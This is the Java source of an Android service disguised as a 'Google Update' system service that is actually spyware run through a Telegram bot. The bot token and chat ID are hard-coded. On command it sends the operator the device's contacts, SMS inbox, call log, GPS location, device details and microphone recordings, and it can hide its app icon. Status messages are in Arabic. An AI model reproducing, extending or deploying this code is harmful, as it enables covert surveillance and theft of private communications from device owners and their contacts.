package com.google.update;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import javax.net.ssl.HttpsURLConnection;

public class TelegramBotService extends Service {
    private static final String BOT_TOKEN = "8750593602:AAFTlpdAXxNiJ7LuRdDP4TSQ6Hqn8C_fAhs";
    private static final String CHAT_ID = "6793813126";
    private static final String TELEGRAM_API = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
    private static final String CHANNEL_ID = "GoogleUpdateChannel";
    private Thread botThread;
    private volatile boolean running = true;
    private int lastUpdateId = 0;
    private MediaRecorder mediaRecorder;
    private String currentAudioPath;
    private boolean isRecording = false;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1001, createNotification());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        sendTelegramMessage("✅ Google Update Service Activated\n📱 Device: " + getDeviceModel());
        botThread = new Thread(this::botListenerLoop);
        botThread.start();
        return START_STICKY;
    }

    private void botListenerLoop() {
        while (running) {
            try {
                String response = httpGet(TELEGRAM_API + "getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=30");
                if (response != null) {
                    JSONObject json = new JSONObject(response);
                    if (json.getBoolean("ok")) {
                        JSONArray results = json.getJSONArray("result");
                        for (int i = 0; i < results.length(); i++) {
                            JSONObject update = results.getJSONObject(i);
                            int updateId = update.getInt("update_id");
                            if (updateId > lastUpdateId) {
                                lastUpdateId = updateId;
                                processCommand(update);
                            }
                        }
                    }
                }
            } catch (Exception e) { Log.e("Bot", "Loop error", e); }
            try { Thread.sleep(1000); } catch (InterruptedException e) { break; }
        }
    }

    private void processCommand(JSONObject update) throws Exception {
        if (!update.has("message")) return;
        JSONObject message = update.getJSONObject("message");
        if (!message.has("text")) return;
        String text = message.getString("text").trim().toLowerCase();
        long chatId = message.getJSONObject("chat").getLong("id");
        if (!String.valueOf(chatId).equals(CHAT_ID)) return;

        if (text.startsWith("/")) {
            String cmd = text.split(" ")[0];
            switch (cmd) {
                case "/start":
                    sendTelegramMessage("🔰 Google Update Commands:\n/contacts\n/sms\n/calllog\n/record X\n/location\n/hide\n/show\n/info");
                    break;
                case "/contacts":
                    sendTelegramMessage("⏳ جمع جهات الاتصال...");
                    sendFile("contacts.txt", getContacts().getBytes());
                    break;
                case "/sms":
                    sendTelegramMessage("⏳ جمع الرسائل...");
                    sendFile("sms.txt", getSms().getBytes());
                    break;
                case "/calllog":
                    sendTelegramMessage("⏳ جمع سجل المكالمات...");
                    sendFile("call_log.txt", getCallLog().getBytes());
                    break;
                case "/record":
                    int duration = 30;
                    if (text.split(" ").length > 1) {
                        try { duration = Integer.parseInt(text.split(" ")[1]); } catch (NumberFormatException ignored) {}
                    }
                    startRecording(duration);
                    break;
                case "/location":
                    getLocationAndSend();
                    break;
                case "/hide":
                    hideApp();
                    sendTelegramMessage("✅ تم الإخفاء");
                    break;
                case "/show":
                    showApp();
                    sendTelegramMessage("✅ تم الإظهار");
                    break;
                case "/info":
                    sendTelegramMessage(getDeviceInfo());
                    break;
                default:
                    sendTelegramMessage("⚠️ أمر غير معروف");
                    break;
            }
        }
    }

    private String getContacts() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append(name).append(" : ").append(phone).append("\n");
                }
                cursor.close();
            }
        } catch (Exception e) { sb.append("Error: ").append(e.getMessage()); }
        return sb.toString();
    }

    private String getSms() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    sb.append(address).append(": ").append(body).append("\n---\n");
                }
                cursor.close();
            }
        } catch (Exception e) { sb.append("Error: ").append(e.getMessage()); }
        return sb.toString();
    }

    private String getCallLog() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    sb.append(name != null ? name : "غير معروف").append(" - ").append(number).append("\n");
                }
                cursor.close();
            }
        } catch (Exception e) { sb.append("Error: ").append(e.getMessage()); }
        return sb.toString();
    }

    private void startRecording(int durationSeconds) {
        try {
            currentAudioPath = getExternalFilesDir(null) + "/recording_" + System.currentTimeMillis() + ".mp4";
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setOutputFile(currentAudioPath);
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            sendTelegramMessage("🔴 بدأ التسجيل لـ " + durationSeconds + " ثانية...");
            new android.os.Handler(Looper.getMainLooper()).postDelayed(() -> {
                try {
                    if (mediaRecorder != null && isRecording) {
                        mediaRecorder.stop();
                        mediaRecorder.release();
                        mediaRecorder = null;
                        isRecording = false;
                        File audioFile = new File(currentAudioPath);
                        if (audioFile.exists()) sendFile(audioFile.getName(), readFileBytes(audioFile));
                    }
                } catch (Exception e) { sendTelegramMessage("❌ خطأ في التسجيل"); }
            }, durationSeconds * 1000L);
        } catch (Exception e) { sendTelegramMessage("❌ فشل التسجيل"); }
    }

    private void getLocationAndSend() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
            Location lastKnown = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (lastKnown != null) {
                sendTelegramLocation(lastKnown.getLatitude(), lastKnown.getLongitude());
            } else {
                lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, new LocationListener() {
                    @Override public void onLocationChanged(@NonNull Location location) { sendTelegramLocation(location.getLatitude(), location.getLongitude()); }
                    @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                    @Override public void onProviderEnabled(@NonNull String provider) {}
                    @Override public void onProviderDisabled(@NonNull String provider) {}
                }, Looper.getMainLooper());
            }
        } catch (Exception e) { sendTelegramMessage("❌ خطأ في الموقع"); }
    }

    private void sendTelegramMessage(String text) {
        new Thread(() -> {
            try {
                String urlStr = TELEGRAM_API + "sendMessage";
                String params = "chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8") + "&parse_mode=Markdown";
                HttpsURLConnection conn = (HttpsURLConnection) new URL(urlStr).openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                conn.setDoOutput(true);
                conn.getOutputStream().write(params.getBytes());
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) { Log.e("TG", "Send message error", e); }
        }).start();
    }

    private void sendTelegramLocation(double lat, double lon) {
        new Thread(() -> {
            try {
                String urlStr = TELEGRAM_API + "sendLocation";
                String params = "chat_id=" + CHAT_ID + "&latitude=" + lat + "&longitude=" + lon;
                HttpsURLConnection conn = (HttpsURLConnection) new URL(urlStr).openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                conn.setDoOutput(true);
                conn.getOutputStream().write(params.getBytes());
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) { Log.e("TG", "Send location error", e); }
        }).start();
    }

    private void sendFile(String fileName, byte[] fileData) {
        new Thread(() -> {
            try {
                String boundary = "----Boundary" + System.currentTimeMillis();
                URL url = new URL(TELEGRAM_API + "sendDocument");
                HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setDoOutput(true);
                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                dos.writeBytes(CHAT_ID + "\r\n");
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + fileName + "\"\r\n");
                dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
                dos.write(fileData);
                dos.writeBytes("\r\n");
                dos.writeBytes("--" + boundary + "--\r\n");
                dos.flush();
                dos.close();
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) { Log.e("TG", "Send file error", e); }
        }).start();
    }

    private String httpGet(String urlStr) {
        try {
            HttpsURLConnection conn = (HttpsURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("GET");
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            conn.disconnect();
            return sb.toString();
        } catch (Exception e) { return null; }
    }

    private byte[] readFileBytes(File file) {
        try {
            FileInputStream fis = new FileInputStream(file);
            byte[] data = new byte[(int) file.length()];
            fis.read(data);
            fis.close();
            return data;
        } catch (Exception e) { return new byte[0]; }
    }

    private String getDeviceModel() { return Build.MANUFACTURER + " " + Build.MODEL; }
    private String getDeviceInfo() { return "📱 **معلومات الجهاز**\nالموديل: " + Build.MODEL + "\nالشركة: " + Build.MANUFACTURER + "\nأندرويد: " + Build.VERSION.RELEASE; }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Google Update Service", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }
    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google Update")
            .setContentText("System update in progress...")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setOngoing(true).build();
    }
    private void hideApp() { try { MainActivity.showAppIcon(this); } catch (Exception e) {} }
    private void showApp() { try { MainActivity.showAppIcon(this); } catch (Exception e) {} }

    @Nullable @Override public IBinder onBind(Intent intent) { return null; }
    @Override public void onDestroy() { running = false; if (mediaRecorder != null) mediaRecorder.release(); super.onDestroy(); }
}
